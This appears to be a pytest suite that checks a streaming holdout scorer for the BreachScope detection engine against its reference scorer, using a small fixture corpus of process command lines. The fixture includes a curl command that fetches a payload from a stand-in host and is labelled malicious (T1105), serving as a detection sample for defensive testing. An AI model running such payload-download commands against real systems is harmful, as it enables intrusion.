from __future__ import annotations

import hashlib
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "scripts"
RULES = ROOT / "rules"
sys.path.insert(0, str(SCRIPTS))

import evaluate_external_holdout as reference  # noqa: E402


def _load_streaming():
    path = SCRIPTS / "p2_37_score_external_holdout_streaming.py"
    spec = importlib.util.spec_from_file_location(
        "p2_37_streaming_score_test",
        path,
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


streaming = _load_streaming()


def _sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _row(
    *,
    timestamp: str,
    host: str,
    record_id: int,
    command_line: str,
) -> dict:
    raw = {
        "timestamp": timestamp,
        "host": host,
        "source": "UnitTest",
        "event_id": "1",
        "user": "",
        "command_line": command_line,
        "channel": "UnitTest/Operational",
        "event_record_id": str(record_id),
    }
    return {
        **raw,
        "raw": dict(raw),
    }


def _write_jsonl(path: Path, rows: list[dict]) -> None:
    path.write_text(
        "".join(
            json.dumps(row, ensure_ascii=False) + "\n"
            for row in rows
        ),
        encoding="utf-8",
        newline="\n",
    )


def _write_fixture(
    tmp_path: Path,
    *,
    omit_last_label: bool = False,
) -> tuple[Path, Path, Path, Path]:
    corpus = tmp_path / "corpus.jsonl"
    rows = [
        _row(
            timestamp="2025-01-06T00:00:01+00:00",
            host="CLIENT1",
            record_id=1,
            command_line="curl http://example.invalid/payload",
        ),
        _row(
            timestamp="2025-01-06T00:00:02+00:00",
            host="CLIENT1",
            record_id=2,
            command_line="notepad.exe",
        ),
        _row(
            timestamp="2025-01-06T00:00:03+00:00",
            host="CLIENT2",
            record_id=3,
            command_line="curl http://example.invalid/context",
        ),
    ]
    _write_jsonl(corpus, rows)

    label_rows = [
        {
            "event_key": reference.event_key(rows[0]),
            "label": "malicious",
            "expected_techniques": ["T1105"],
            "notes": "malicious fixture",
        },
        {
            "event_key": reference.event_key(rows[1]),
            "label": "benign",
            "expected_techniques": [],
            "notes": "benign fixture",
        },
        {
            "event_key": reference.event_key(rows[2]),
            "label": "ignore",
            "expected_techniques": [],
            "notes": "ignored context fixture",
        },
    ]
    if omit_last_label:
        label_rows.pop()

    labels = tmp_path / "labels.jsonl"
    _write_jsonl(labels, label_rows)

    manifest = {
        "schema": "breachscope.external_holdout.v1",
        "kind": "external_blind_holdout",
        "evaluation_class": "external_baseline",
        "protocol": {
            "independent_from_rule_authoring": True,
            "ground_truth_prepared_without_breachscope_findings": True,
            "final_holdout_seen_before_rule_freeze": False,
        },
        "files": [
            {
                "path": "corpus.jsonl",
                "sha256": _sha(corpus),
                "format": "jsonl",
            }
        ],
        "labels": {
            "sha256": _sha(labels),
        },
        "scenarios": [
            {
                "scenario_id": "curl-download",
                "source_files": ["corpus.jsonl"],
                "expected_techniques": ["T1105"],
            }
        ],
    }
    manifest_path = tmp_path / "manifest.yaml"
    manifest_path.write_text(
        yaml.safe_dump(manifest, sort_keys=False),
        encoding="utf-8",
        newline="\n",
    )

    commit = subprocess.check_output(
        ["git", "rev-parse", "HEAD"],
        cwd=ROOT,
        text=True,
    ).strip()
    rule_hash, rule_count = reference.rules_tree_hash(RULES)
    freeze = {
        "schema": reference.FREEZE_SCHEMA,
        "repo_commit": commit,
        "rules_dir": str(RULES.resolve()),
        "rules_tree_sha256": rule_hash,
        "rule_file_count": rule_count,
    }
    freeze_path = tmp_path / "freeze.json"
    freeze_path.write_text(
        json.dumps(freeze, indent=2) + "\n",
        encoding="utf-8",
        newline="\n",
    )
    return manifest_path, corpus, labels, freeze_path


def _without_runtime(result: dict) -> dict:
    copy = dict(result)
    copy.pop("performance", None)
    copy.pop("streaming_execution", None)
    return copy


def test_streaming_score_matches_reference_accounting(
    tmp_path: Path,
) -> None:
    manifest, _, labels, freeze = _write_fixture(tmp_path)

    expected = reference.score_holdout(
        repo=ROOT,
        manifest_path=manifest,
        corpus_root=tmp_path,
        labels_path=labels,
        freeze_path=freeze,
        rules_dir=RULES,
    )
    actual = streaming.score_streaming(
        repo=ROOT,
        manifest_path=manifest,
        corpus_root=tmp_path,
        labels_path=labels,
        freeze_path=freeze,
        rules_dir=RULES,
        work_dir=tmp_path / "stream-work",
    )

    assert _without_runtime(actual) == _without_runtime(expected)

    assert actual["detection"]["confusion"] == {
        "tp": 1,
        "fp": 0,
        "tn": 1,
        "fn": 0,
    }
    assert actual["detection"]["flagged_ignored_events"] == 1
    assert actual["detection"]["expected_technique_hits"] == 1
    assert actual["detection"]["expected_technique_total"] == 1
    assert actual["scenarios"]["hits"] == 1
    assert actual["streaming_execution"] == {
        "corpus_loaded_fully_into_python_memory": False,
        "labels_loaded_fully_into_python_memory": False,
        "disk_backed_state": "SQLite",
        "corpus_passes": 2,
        "detection_event_order_preserved": True,
    }


def test_streaming_score_fails_before_detection_on_label_gap(
    tmp_path: Path,
) -> None:
    manifest, _, labels, freeze = _write_fixture(
        tmp_path,
        omit_last_label=True,
    )

    with pytest.raises(
        reference.HoldoutError,
        match=r"label coverage must be exact: missing=1 extra=0",
    ):
        streaming.score_streaming(
            repo=ROOT,
            manifest_path=manifest,
            corpus_root=tmp_path,
            labels_path=labels,
            freeze_path=freeze,
            rules_dir=RULES,
            work_dir=tmp_path / "stream-work",
        )


def test_streaming_score_rejects_non_external_baseline(
    tmp_path: Path,
) -> None:
    manifest, _, labels, freeze = _write_fixture(tmp_path)
    data = yaml.safe_load(manifest.read_text(encoding="utf-8"))
    data["evaluation_class"] = "external_calibration"
    manifest.write_text(
        yaml.safe_dump(data, sort_keys=False),
        encoding="utf-8",
        newline="\n",
    )

    with pytest.raises(
        streaming.StreamingScoreError,
        match="evaluation_class=external_baseline",
    ):
        streaming.score_streaming(
            repo=ROOT,
            manifest_path=manifest,
            corpus_root=tmp_path,
            labels_path=labels,
            freeze_path=freeze,
            rules_dir=RULES,
            work_dir=tmp_path / "stream-work",
        )
